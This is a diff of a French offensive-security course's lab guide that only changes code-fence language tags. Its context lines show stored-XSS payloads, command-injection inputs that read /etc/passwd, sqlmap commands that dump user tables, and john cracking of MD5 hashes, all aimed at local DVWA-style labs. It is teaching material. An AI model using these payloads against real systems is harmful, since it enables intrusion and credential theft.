@@ -55,7 +55,7 @@ git clone https://github.com/yugmerabtene/techniques-hacking-mdj.git repo
 
 Une fois le dépôt cloné, votre arborescence de travail est la suivante :
 
-```
+```text
 ~/cours-hacking/
 ├── jour-1/
 │   └── labs/              # Travaux pratiques J1
@@ -420,7 +420,7 @@ Retournez dans le **Terminal 1** (écouteur HTTP) pour confirmer.
 ### Étape 3 — Stored XSS
 
 DVWA → **XSS (Stored)** :
-```
+```html
 Name: Attaquant
 Message: <script>alert('Stored XSS')</script>
 ```
@@ -489,9 +489,9 @@ sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie="PHPSESSID=XXXX;security=low" \
   -D dvwa -T users -C user,password --dump --batch
 ```
-
 Sortie attendue :
-```
+
+```text
 +---------+---------------------------------------------+
 | user    | password                                    |
 +---------+---------------------------------------------+
@@ -548,7 +548,7 @@ La fonction `shell_exec("ping -c 4 " . $target)` exécute tout ce qui suit `ping
 ### Étape 1 — Command injection basique
 
 DVWA → **Command Injection** :
-```
+```bash
 127.0.0.1; whoami     → www-data
 127.0.0.1; ls /etc/   → contenu de /etc/
 127.0.0.1; cat /etc/passwd → utilisateurs
@@ -709,7 +709,7 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" --tables --batch 2>&1 | tee 
 
 Sortie attendue :
 
-```
+```text
 [2 tables]
 +----------+
 | products |
@@ -723,7 +723,7 @@ Sortie attendue :
 sqlmap -u "http://localhost:8083/?page=search&id=1" -T users --columns --batch
 ```
 
-```
+```text
 [5 columns]
 +-----------+----------+
 | Column    | Type     |
@@ -745,7 +745,7 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" \
 
 Sortie attendue :
 
-```
+```text
 +------------+----------------------------------+---------------------+------------+
 | username   | password                         | email               | role       |
 +------------+----------------------------------+---------------------+------------+
@@ -796,7 +796,7 @@ john --show --format=raw-md5 hashes.txt  # Affiche tous les mots de passe déjà
 
 Sortie attendue :
 
-```
+```text
 admin:password
 john_doe:password123
 jane_dev:abc123
@@ -838,7 +838,7 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" \
   -T products -C name,secret_flag --dump --batch
 ```
 
-```
+```text
 +---------------------+--------------------------------+
 | name                | secret_flag                    |
 +---------------------+--------------------------------+
